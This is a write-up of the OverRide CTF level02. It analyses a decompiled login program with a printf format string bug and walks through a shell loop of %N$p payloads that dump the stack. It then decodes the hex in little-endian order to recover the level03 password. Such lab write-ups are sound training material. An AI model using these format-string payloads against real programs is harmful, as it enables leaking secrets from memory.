# level02

### First analysis

Let's first analyse the code and checksec of this level, so first with the checksec:

```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```

As we can see there is the minimum security on this binary, no RELRO, so GOT overwrite would be possible and NX is disabled so the stack is executable, shellcode in env variable would be possible too. Let's now analyse the code.

```c
int main(void) {
    char    password[41];
    char    username[96];
    char    input_password[96];
    int     length;
    FILE    *fd;
    
    memset(password, 0, 41);
    memset(username, 0, 96);
    memset(input_password, 0, 96);

    fd = fopen("home/users/level03/.pass", "r");
    if (!fd) {
        fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
        exit(1);
    }

    length = fread(password, 1, 41, fd);
    password[strcspn(password, "\n")] = '\0';

    if (length != 41) {
        fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
        fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
        exit(1);
    }
    fclose(fd);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    
    printf("--[ Username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = '\0';

    printf("--[ Password: ");
    fgets(input_password, sizeof(input_password), stdin);
    input_password[strcspn(input_password, "\n")] = '\0';
    puts("*****************************************");

    if (strncmp(password, input_password, 41) == 0) {
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
        return 0;
    }

    printf(username);
    puts(" does not have access!");
    exit(1);
}
```

There are a lot of security measures taken in this program such as checking the '\0' on every input or using fgets() with a sizeof to be sure not to go over the buffer size. However one thing had been forgotten, as we can see a "printf(username);" is used, which represent a Format String Vulnerability. This means that we can read the stack with this kind of exploit and write using %n at any address. Even after knowing that, we can notice that the password of level3 is read and stored into password buffer, which mean that coupled with the FSV, we could read the password buffer and access to the password without needing to write anything anywhere. Let's first check confirm that this vulnerability works:

```sh
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %x %x
--[ Password: 
*****************************************
ffffe500 0 does not have access!
```

We place %x into username field, because it is the one used in the FSV and it is interpreted, so we indeed have a Format String Vulnerability.

### Solution

The buffer of username is limited, we have 41 characters which mean we can print 20 stack memory slot. Maybe it won't be sufficient to print fully the password buffer, so we did a command that prints the 100 firsts stack memory slot:

```sh
for (( i = 1; i < 100; i++ )); do   echo "%$i\$18p" | ./level02 | awk '/does not have access/'; done
```

What it does is using this synthax %4$18p for example, that prints the 4th memory space of the stack with a size of 18. We then only selects the lines that contains "does not have access" in order to avoid all the prompts and puts() made by the program, and we do this from 1 to 100.

```sh
level02@OverRide:~$ for (( i = 1; i < 100; i++ )); do   echo "%$i\$18p" | ./level02 | awk '/does not have access/'; done
    0x7fffffffe500 does not have access!
             (nil) does not have access!
             (nil) does not have access!
0x2a2a2a2a2a2a2a2a does not have access!
0x2a2a2a2a2a2a2a2a does not have access!
    0x7fffffffe6f8 does not have access!
       0x1f7ff9a08 does not have access!
[...]
       0x100000000 does not have access!
             (nil) does not have access!
0x756e505234376848 does not have access!
0x45414a3561733951 does not have access!
0x377a7143574e6758 does not have access!
0x354a35686e475873 does not have access!
0x48336750664b394d does not have access!
          0xfeff00 does not have access!
  0x70383124383225 does not have access!
[...]
      0x2900000000 does not have access!
          0x602010 does not have access!
             (nil) does not have access!
    0x7ffff7a3d7ed does not have access!
[...]
```

Here we only select parts that allows us to explain what we see. The padding allows us to read things more clearly. So first we can see these "2a2a2a2a2a2a2a2a", this is just the '*' char repeated again and again, probably what's printed by the program after input_password. There are a bunch of (nil) addresses, then we can see 5 addresses that doesn't look like actual addresses. and at the end we can see some elements that looks like some actual addresses. Let's focus on these weird elements that doesn't look like addresses, if they correspond to ascii characters, it probably means we are in the right direction. By using a converter we get that:

```
756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394dfeff00

=

unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9Mþÿ
```

These hexadecimal elements are indeed corresponding to ascii characters besides the 3 lasts ones. We can try to enter this as a password (removing the 3 lasts chars) for level03 but it won't work. Let's take again the part of the memory we are analysing:

```sh
0x756e505234376848 does not have access!
0x45414a3561733951 does not have access!
0x377a7143574e6758 does not have access!
0x354a35686e475873 does not have access!
0x48336750664b394d does not have access!
          0xfeff00 does not have access!
```
We know that in c, a string is null ended, so it ends with '\0', in hexadecimal '00', which could correspond to the last line after the feff. Why after ? Because we have to remember that this machine is in little endian format, so we have to read the addresses upside down if we want to read them correctly. So let's write a little code that put every element in big endian, then translate it in ascii. You can find this file [here](https://github.com/kbarbry/OverRide/blob/main/level02/Resources/reverse_translate.c). Then the password is printed and we can use it:

```sh
level03@OverRide:/tmp$ gcc -std=c99 reverse_translate.c 
level03@OverRide:/tmp$ ./a.out 
Original: 0x756e505234376848
ASCII: Hh74RPnu

Original: 0x45414a3561733951
ASCII: Q9sa5JAE

Original: 0x377a7143574e6758
ASCII: XgNWCqz7

Original: 0x354a35686e475873
ASCII: sXGnh5J5

Original: 0x48336750664b394d
ASCII: M9KfPg3H

Final ASCII: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
level03@OverRide:/tmp$ su level03
Password:
```

## Important doc

[Hex to Ascii converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
